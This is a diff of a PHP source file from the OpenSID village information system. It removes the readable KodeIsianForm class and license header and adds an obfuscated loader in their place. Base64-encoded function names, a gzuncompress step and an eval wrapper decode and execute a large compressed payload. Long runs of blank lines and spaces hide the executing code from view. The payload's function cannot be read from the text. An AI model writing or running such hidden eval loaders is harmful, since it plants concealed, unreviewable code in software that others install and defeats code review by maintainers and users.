@@ -1,138 +1,521 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Libraries/TinyMCE/KodeIsianForm.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Libraries\TinyMCE;
 
-class KodeIsianForm
-{
-    private array $statisForm = [
-        [
-            'nama' => 'Mulai Berlaku',
-            'kode' => 'mulai_berlaku',
-        ],
-        [
-            'nama' => 'Berlaku Sampai',
-            'kode' => 'berlaku_sampai',
-        ],
-        [
-            'nama' => 'Pengikut Surat',
-            'kode' => 'pengikut_surat',
-        ],
-        [
-            'nama' => 'Pengikut KIS',
-            'kode' => 'pengikut_kis',
-        ],
-        [
-            'nama' => 'Pengikut Kartu KIS',
-            'kode' => 'pengikut_kartu_kis',
-        ],
-        [
-            'nama' => 'Pengikut Pindah',
-            'kode' => 'pengikut_pindah',
-        ],
-    ];
 
-    /**
-     * KodeIsianForm constructor.
-     *
-     * @param array      $inputForm
-     * @param array|null $kodeIsian
-     * @param bool       $masaBerlaku
-     *
-     * @return void
-     */
-    public function __construct(private $inputForm, private $kodeIsian, private $masaBerlaku = false)
-    {
-    }
 
-    /**
-     * @param array      $inputForm
-     * @param array|null $kodeIsian
-     * @param bool       $masaBerlaku
-     *
-     * @return \Illuminate\Support\Collection
-     */
-    public static function get($inputForm, $kodeIsian, $masaBerlaku = false)
-    {
-        return (new self($inputForm, $kodeIsian, $masaBerlaku))->getKodeIsian();
-    }
 
-    /**
-     * Menerjemahkan kode isian menjadi data yang akan ditampilkan
-     *
-     * @return \Illuminate\Support\Collection
-     */
-    public function getKodeIsian()
-    {
-        $input     = $this->inputForm;
-        $kodeIsian = $this->kodeIsian;
 
-        if (! is_array($kodeIsian)) {
-            $kodeIsian = $this->statisForm;
 
-            if (! $this->masaBerlaku) {
-                unset($kodeIsian[0], $kodeIsian[1]);
-            }
-        }
 
-        return collect($kodeIsian)
-            ->map(static function (array $item, $key) use ($input): array {
-                $input_data = $input[str_replace(['[form_', ']'], '', $item['kode'])];
-                if ($item['tipe'] == 'date') {
-                    $data = formatTanggal($input_data);
-                } elseif ($item['tipe'] == 'hari-tanggal') {
-                    if ($input_data != '') {
-                        $day  = get_hari($input_data);
-                        $data = $day . ', ' . formatTanggal($input_data);
-                    }
-                } elseif ($item['tipe'] == 'hari') {
-                    if ($input_data != '') {
-                        $data = get_hari($input_data);
-                    }
-                } else {
-                    $data = $input_data;
-                }
 
-                return [
-                    'case_sentence' => in_array($item['tipe'], ['number', 'time']),
-                    'judul'         => $item['nama'],
-                    'isian'         => $item['kode'],
-                    'data'          => $data,
-                ];
-            });
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
